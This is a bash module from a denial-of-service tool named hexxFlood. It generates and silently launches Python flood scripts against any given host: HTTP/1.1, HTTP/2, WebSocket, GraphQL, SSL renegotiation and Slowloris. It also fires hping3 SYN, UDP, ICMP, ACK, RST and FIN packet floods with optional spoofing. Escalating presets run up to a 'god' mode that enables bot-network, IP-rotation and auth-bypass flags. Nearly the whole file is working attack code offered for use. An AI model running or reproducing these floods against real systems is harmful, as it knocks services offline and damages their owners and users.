#!/usr/bin/env bash
# ============================================================
# hexxFlood :: lib/attacks.sh
# The payload arsenal. Layer-7 Python floods (HTTP/1.1, HTTP/2,
# WebSocket, GraphQL, SSL-reneg, Slowloris), the hping3 raw
# packet launchers (SYN/UDP/ICMP/ACK/RST/FIN), worker-count
# computation, and per-mode presets (low → god).
# ============================================================

# ---- shared Python-flood launcher --------------------------
# Every Layer-7 flood generates a /tmp/*.py script and runs it the same way:
# prefer the hexxFlood venv interpreter (which carries h2/websocket-client/
# requests), else fall back to the system python3. Centralised here so the six
# flood functions don't each repeat the interpreter-selection + detach boilerplate.

hexx_python() {
    if [ -x /opt/hexxFlood-venv/bin/python ]; then
        printf '%s' /opt/hexxFlood-venv/bin/python
    else
        printf '%s' python3
    fi
}

# launch_python_flood <script.py> [args...] — run detached, fully silent.
launch_python_flood() {
    local script="$1"; shift
    $DETACH "$(hexx_python)" "$script" "$@" </dev/null >/dev/null 2>&1 &
}

http_flood() {
    local url="$1"
    local threads="${2:-50}"
    local duration="${3:-0}"
    
    echo -e "${YELLOW}🌐 Starting HTTP flood on $url${NC}"
    echo -e "${YELLOW}   Threads: $threads${NC}"
    
    cat > /tmp/http_flood.py << 'PYEOF'
import sys, time, threading, urllib.request, urllib.error, ssl, random
from concurrent.futures import ThreadPoolExecutor

url = sys.argv[1]
threads = int(sys.argv[2])
duration = int(sys.argv[3])

ssl._create_default_https_context = ssl._create_unverified_context

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
]

def make_request():
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    }
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.read()
    except:
        return None

def worker():
    while running:
        try:
            make_request()
        except:
            pass

running = True
start_time = time.time()

print(f"Starting HTTP flood on {url} with {threads} threads")

with ThreadPoolExecutor(max_workers=threads) as executor:
    futures = [executor.submit(worker) for _ in range(threads)]
    if duration > 0:
        time.sleep(duration)
        running = False
    else:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            running = False
    for future in futures:
        future.cancel()

print("HTTP flood stopped")
PYEOF

    launch_python_flood /tmp/http_flood.py "$url" "$threads" "$duration"
}

# ============================================================
# SECTION 7: HTTP/2 FLOOD
# ============================================================

generate_http2_flood() {
    local target="$1"
    local port="$2"
    local threads="${3:-50}"
    local duration="${4:-0}"
    
    echo -e "${YELLOW}🔷 Starting HTTP/2 flood on $target:$port${NC}"
    
    cat > /tmp/http2_flood.py << 'PYEOF'
import sys, time, threading, ssl, socket, random
try:
    import h2.connection
    import h2.config
    HAS_H2 = True
except ImportError:
    HAS_H2 = False

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])
duration = int(sys.argv[4])

if not HAS_H2:
    print("HTTP/2 requires h2 library: pip install h2")
    sys.exit(1)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
]

def http2_flood():
    while running:
        try:
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            conn.initiate_connection()
            sock.send(conn.data_to_send())
            
            for stream_id in range(1, 100):
                headers = [
                    (':method', 'GET'),
                    (':path', '/'),
                    (':scheme', 'https'),
                    (':authority', target),
                    ('user-agent', random.choice(USER_AGENTS)),
                ]
                conn.send_headers(stream_id, headers, end_stream=True)
                sock.send(conn.data_to_send())
            sock.close()
        except:
            pass

running = True
for i in range(threads):
    threading.Thread(target=http2_flood).start()

if duration > 0:
    time.sleep(duration)
    running = False
else:
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
PYEOF

    launch_python_flood /tmp/http2_flood.py "$target" "$port" "$threads" "$duration"
}

# ============================================================
# SECTION 8: WEBSOCKET FLOOD
# ============================================================

generate_websocket_flood() {
    local target="$1"
    local port="$2"
    local threads="${3:-50}"
    local duration="${4:-0}"
    
    echo -e "${YELLOW}🔷 Starting WebSocket flood on $target:$port${NC}"
    
    cat > /tmp/websocket_flood.py << 'PYEOF'
import sys, time, threading, random
try:
    import websocket
    HAS_WS = True
except ImportError:
    HAS_WS = False

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])
duration = int(sys.argv[4])

if not HAS_WS:
    print("WebSocket requires websocket-client: pip install websocket-client")
    sys.exit(1)

def websocket_flood():
    while running:
        try:
            ws = websocket.WebSocket()
            ws.connect(f"ws://{target}:{port}/ws")
            for i in range(100):
                ws.send(f"ping_{i}")
            ws.close()
        except:
            pass

running = True
for i in range(threads):
    threading.Thread(target=websocket_flood).start()

if duration > 0:
    time.sleep(duration)
    running = False
else:
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
PYEOF

    launch_python_flood /tmp/websocket_flood.py "$target" "$port" "$threads" "$duration"
}

# ============================================================
# SECTION 9: GRAPHQL FLOOD
# ============================================================

generate_graphql_flood() {
    local target="$1"
    local port="$2"
    local threads="${3:-50}"
    local duration="${4:-0}"
    
    echo -e "${YELLOW}🔷 Starting GraphQL flood on $target:$port${NC}"
    
    cat > /tmp/graphql_flood.py << 'PYEOF'
import sys, time, threading, json, random
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])
duration = int(sys.argv[4])

if not HAS_REQUESTS:
    print("GraphQL requires requests: pip install requests")
    sys.exit(1)

QUERIES = [
    "query { __schema { types { name fields { name } } } }",
    "query { __typename }",
    "query { allUsers { id name email } }",
    "mutation { createUser(input: {name:\"test\"}) { id } }",
]

def graphql_flood():
    while running:
        try:
            query = random.choice(QUERIES)
            url = f"http://{target}:{port}/graphql"
            if port == 443:
                url = f"https://{target}/graphql"
            response = requests.post(
                url,
                json={"query": query},
                headers={"Content-Type": "application/json"},
                timeout=5
            )
        except:
            pass

running = True
for i in range(threads):
    threading.Thread(target=graphql_flood).start()

if duration > 0:
    time.sleep(duration)
    running = False
else:
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
PYEOF

    launch_python_flood /tmp/graphql_flood.py "$target" "$port" "$threads" "$duration"
}

# ============================================================
# SECTION 10: SSL RENEGOTIATION ATTACK
# ============================================================

ssl_renegotiation_attack() {
    local target="$1"
    local port="${2:-443}"
    local threads="${3:-50}"
    
    echo -e "${YELLOW}🔷 Starting SSL renegotiation attack on $target:$port${NC}"
    
    cat > /tmp/ssl_reneg.py << 'PYEOF'
import sys, time, threading, ssl, socket

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])

def ssl_reneg():
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=target)
            for _ in range(50):
                ssl_sock.do_handshake()
            ssl_sock.close()
        except:
            pass

running = True
for i in range(threads):
    threading.Thread(target=ssl_reneg).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    running = False
PYEOF

    launch_python_flood /tmp/ssl_reneg.py "$target" "$port" "$threads"
}

# ============================================================
# SECTION 11: SLOWLORIS ATTACK
# ============================================================

slowloris_attack() {
    local target="$1"
    local port="${2:-80}"
    local threads="${3:-50}"
    
    echo -e "${YELLOW}🔷 Starting Slowloris attack on $target:$port${NC}"
    
    cat > /tmp/slowloris.py << 'PYEOF'
import sys, time, threading, socket, random

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])

def slowloris():
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target}\r\n".encode())
            sock.send("User-Agent: Mozilla/5.0\r\n".encode())
            while running:
                sock.send(f"X-Header: {random.randint(0, 1000)}\r\n".encode())
                time.sleep(15)
        except:
            pass

running = True
for i in range(threads):
    threading.Thread(target=slowloris).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    running = False
PYEOF

    launch_python_flood /tmp/slowloris.py "$target" "$port" "$threads"
}

# ---- launch dispatch ---------------------------------------

launch_flood() {
    local t="$1" p="$2" flag pflag=""
    case "$t" in
        syn)  flag="-S" ;;   # TCP SYN
        udp)  flag="-2" ;;   # UDP
        icmp) flag="-1" ;;   # ICMP
        ack)  flag="-A" ;;   # TCP ACK
        rst)  flag="-R" ;;   # TCP RST
        fin)  flag="-F" ;;   # TCP FIN
        *)    return 1 ;;
    esac
    # ICMP carries no port; every other vector floods a (optionally randomised
    # via $PP) destination port. $SPOOF_FLAG/$pflag stay unquoted on purpose so
    # empty values disappear and multi-word flags split correctly.
    [ "$t" != icmp ] && pflag="-p ${PP}$p"
    sudo $DETACH hping3 $flag --flood $SPOOF_FLAG $pflag -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 &
}

launch_advanced_attack() {
    local type="$1"
    local target="$2"
    local port="$3"
    
    case "$type" in
        http|http1)
            http_flood "$target" "$THREADS" "$ATTACK_DURATION"
            ;;
        http2)
            if [ "$ENABLE_HTTP2" = true ]; then
                generate_http2_flood "$target" "$port" "$THREADS" "$ATTACK_DURATION"
            fi
            ;;
        websocket)
            if [ "$ENABLE_WEBSOCKETS" = true ]; then
                generate_websocket_flood "$target" "$port" "$THREADS" "$ATTACK_DURATION"
            fi
            ;;
        graphql)
            if [ "$ENABLE_GRAPHQL" = true ]; then
                generate_graphql_flood "$target" "$port" "$THREADS" "$ATTACK_DURATION"
            fi
            ;;
        ssl_reneg)
            ssl_renegotiation_attack "$target" "$port" "$THREADS"
            ;;
        slowloris)
            slowloris_attack "$target" "$port" "$THREADS"
            ;;
        syn|udp|icmp|ack|rst|fin)
            launch_flood "$type" "$port"
            ;;
        *)
            echo -e "${YELLOW}⚠️  Unknown attack type: $type${NC}"
            ;;
    esac
}

# ---- worker computation ------------------------------------

compute_flood_workers() {
    local cores; cores=$(nproc 2>/dev/null); [[ "$cores" =~ ^[0-9]+$ ]] || cores=2
    [ "$cores" -lt 1 ] && cores=1
    CORES=$cores
    
    if [[ "${HEXXFLOOD_WORKERS:-}" =~ ^[0-9]+$ ]] && [ "$HEXXFLOOD_WORKERS" -gt 0 ]; then
        FLOOD_WORKERS=$HEXXFLOOD_WORKERS
        WORKERS_FORCED=1
        return
    fi
    
    case "${MODE:-custom}" in
        low)        FLOOD_WORKERS=$(( cores * 2 )) ;;
        medium)     FLOOD_WORKERS=$(( cores * 4 )) ;;
        high)       FLOOD_WORKERS=$(( cores * 8 )) ;;
        extreme)    FLOOD_WORKERS=$(( cores * 16 )) ;;
        apocalypse) FLOOD_WORKERS=$(( cores * 32 )) ;;
        god)        FLOOD_WORKERS=$(( cores * 64 )) ;;
        *)          FLOOD_WORKERS=$(( cores * 8 )) ;;
    esac
    [ "$FLOOD_WORKERS" -lt 1 ] && FLOOD_WORKERS=1

    [ "$NO_CAP" = true ] && return

    local cap=""
    if [[ "${WORKER_CAP:-}" =~ ^[0-9]+$ ]] && [ "$WORKER_CAP" -ge 1 ]; then
        cap=$WORKER_CAP
        CAP_REASON="--cap ${WORKER_CAP}"
    elif [ -d "/sys/class/net/${INTERFACE}/wireless" ] || [ -e "/sys/class/net/${INTERFACE}/phy80211" ]; then
        cap=$(( cores * 4 ))
        CAP_REASON="wireless default"
    fi

    if [ -n "$cap" ] && [ "$FLOOD_WORKERS" -gt "$cap" ]; then
        FLOOD_WORKERS=$cap
        WIFI_CAPPED=1
    fi
}

# ---- attack-mode presets -----------------------------------

set_mode() {
    case $MODE in
        low)
            THREADS=10; DELAY="u100"
            ATTACK_TYPES="syn,udp,icmp,http"
            PACKET_SIZE=1500
            SYS_TUNE=false
            ;;
        medium)
            THREADS=25; DELAY="u10"
            ATTACK_TYPES="syn,udp,icmp,ack,http"
            PACKET_SIZE=4096
            SYS_TUNE=false
            ;;
        high)
            THREADS=50; DELAY="u1"
            ATTACK_TYPES="syn,udp,icmp,ack,rst,fin,http"
            PACKET_SIZE=8192
            SYS_TUNE=true
            ;;
        extreme)
            THREADS=100; DELAY="u1"
            ATTACK_TYPES="all"
            PACKET_SIZE=65495
            SYS_TUNE=true
            ENABLE_HTTP2=true
            ENABLE_WEBSOCKETS=true
            ENABLE_GRAPHQL=true
            [ "${DURATION_SET:-0}" = 1 ] || ATTACK_DURATION=60
            ;;
        apocalypse)
            THREADS=500; DELAY="u1"
            ATTACK_TYPES="all"
            PACKET_SIZE=65495
            SYS_TUNE=true
            ENABLE_HTTP2=true
            ENABLE_HTTP3=true
            ENABLE_WEBSOCKETS=true
            ENABLE_SSE=true
            ENABLE_GRAPHQL=true
            ENABLE_GRPC=true
            ENABLE_DYNAMIC_RATE=true
            ENABLE_BURST_CONTROL=true
            [ "${DURATION_SET:-0}" = 1 ] || ATTACK_DURATION=60
            ;;
        god)
            THREADS=1000; DELAY="u1"
            ATTACK_TYPES="all"
            PACKET_SIZE=65536
            SYS_TUNE=true
            ENABLE_HTTP2=true
            ENABLE_HTTP3=true
            ENABLE_WEBSOCKETS=true
            ENABLE_SSE=true
            ENABLE_GRAPHQL=true
            ENABLE_GRPC=true
            ENABLE_WEBRTC=true
            ENABLE_SESSION_TRACKING=true
            ENABLE_AUTH_BYPASS=true
            ENABLE_IP_ROTATION=true
            ENABLE_GEOLOCATION=true
            ENABLE_CDN_TARGETING=true
            ENABLE_TIMING_RANDOMIZATION=true
            ENABLE_FINGERPRINT_SPOOFING=true
            ENABLE_USERAGENT_ROTATION=true
            ENABLE_DYNAMIC_RATE=true
            ENABLE_BURST_CONTROL=true
            ENABLE_PRIORITY_QUEUE=true
            ENABLE_ADAPTIVE_THROTTLING=true
            ENABLE_CONNECTION_POOLING=true
            ENABLE_ASYNC_IO=true
            ENABLE_AUTO_RECOVERY=true
            ENABLE_LOAD_BALANCING=true
            ENABLE_SELF_HEALING=true
            ENABLE_FAILOVER=true
            ENABLE_BOT_NETWORK=true
            ENABLE_REALTIME_METRICS=true
            ENABLE_API=true
            ENABLE_PLUGINS=true
            BURST_SIZE=50000
            BURST_INTERVAL=1
            BASE_RATE=100000
            MAX_RATE=10000000
            CONNECTION_POOL_SIZE=10000
            ASYNC_WORKERS=1000
            PARALLEL_CONNECTIONS=5000
            [ "${DURATION_SET:-0}" = 1 ] || ATTACK_DURATION=60
            echo -e "${BOLD}${RED}☢️☢️☢️ GOD MODE ACTIVATED ☢️☢️☢️${NC}"
            log_attack "God mode activated"
            ;;
        custom)
            # Use existing settings
            ;;
        *)
            THREADS=50; ATTACK_TYPES="all"
            SYS_TUNE=false
            ;;
    esac
}
